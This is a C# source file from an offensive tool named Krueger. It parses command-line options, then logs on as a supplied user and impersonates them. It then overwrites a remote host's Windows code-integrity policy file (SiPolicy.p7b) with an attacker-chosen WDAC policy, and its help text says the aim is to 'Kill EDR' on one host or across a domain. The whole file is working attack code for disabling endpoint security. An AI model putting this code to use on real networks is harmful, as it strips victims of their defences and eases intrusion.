
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.IO;

namespace Krueger.Modules
{
    internal class ArgParse
    {
        public static void Help()
        {
            string help =
                "Krueger.exe [Options]\n\n" +
                "Options:\n" +
                "\t-h/--help                -     Display this help menu\n" +
                "\t--domain                 -     Kill EDR across the domain\n" +
                "\t--host <hostname>        -     Kill EDR on a specified host\n" +
                "\t--username <user>        -     User to authenticate as\n" +
                "\t--password <password>    -     Password for authenticating user\n" +
                "\t--policy <policy file>   -     WDAC compiled policy to apply on the target(s)\n";

            Console.WriteLine(help);
        }

        public static Dictionary<string, string> Parse(string[] args, string[] flags, string[] options)
        {
            Dictionary<string, string> cmd = new Dictionary<string, string>();

            foreach (string flag in flags)
            {
                if (args.Contains(flag))
                {
                    try
                    {
                        cmd.Add(flag, args[Array.IndexOf(args, flag) + 1]);
                    }
                    catch
                    {
                        Console.WriteLine("[!] Please supply all the valid options, use \"Cable.exe -h\" for more information");
                        return null;
                    }
                }
            }

            foreach (string option in options)
            {
                if (args.Contains(option))
                {
                    cmd.Add(option, "True");
                }
                else
                {
                    cmd.Add(option, "False");
                }
            }

            return cmd;
        }

        public static void Execute(string[] args)
        {

            if (args.Contains("--help") || args.Contains("-h") || args.Length == 0)
            {
                Help();
            }
            else if (args.Length > 0)
            {
                string host = null;
                string username = null;
                string password = null;
                string domain = null;
                string policy = null;
                string fullcompromise = null;

                string[] flags = { "--host", "--username", "--password", "--policy", "--domain" };
                string[] options = { "--fullcompromise" };

                Dictionary<string, string> cmd = Parse(args, flags, options);
                if (cmd == null)
                {
                    return;
                }

                cmd.TryGetValue("--host", out host);
                cmd.TryGetValue("--username", out username);
                cmd.TryGetValue("--password", out password);
                cmd.TryGetValue("--domain", out domain);
                cmd.TryGetValue("--policy", out policy);
                cmd.TryGetValue("--fullcompromise", out fullcompromise);

                if (host != null)
                {
                    if (policy != null)
                    {
                        if (username != null || password != null)
                        {
                            if (username != null && password != null)
                            {
                                if (domain == null)
                                {
                                    Domain d = Domain.GetCurrentDomain();
                                    domain = d.Name;
                                }

                                AppDomain.CurrentDomain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal);
                                IntPtr token = IntPtr.Zero;
                                Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_BATCH, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref token);
                                WindowsIdentity identity = new WindowsIdentity(token);
                                WindowsImpersonationContext context = identity.Impersonate();
                            
                                string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";

                                File.Copy(policy, target, true);
                                Console.WriteLine("[+] Moved policy successfully");
                                context.Undo();
                            }
                            else
                            {
                                Console.WriteLine("[!] You must specify both a username and password");
                            }
                        }
                        else
                        {
                            Domain d = Domain.GetCurrentDomain();
                            string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
                            File.Copy(policy, target, true);
                            Console.WriteLine("[+] Moved policy successfully");
                        }

                    }
                    else
                    {
                        Console.WriteLine("[!] You must supply a WDAC policy to apply on the target");
                    }
                }

            }
            else
            {
                Console.WriteLine("[!] Please specify an option: use \"Krueger.exe -h\" for more details");
            }
            
        }
    }
}
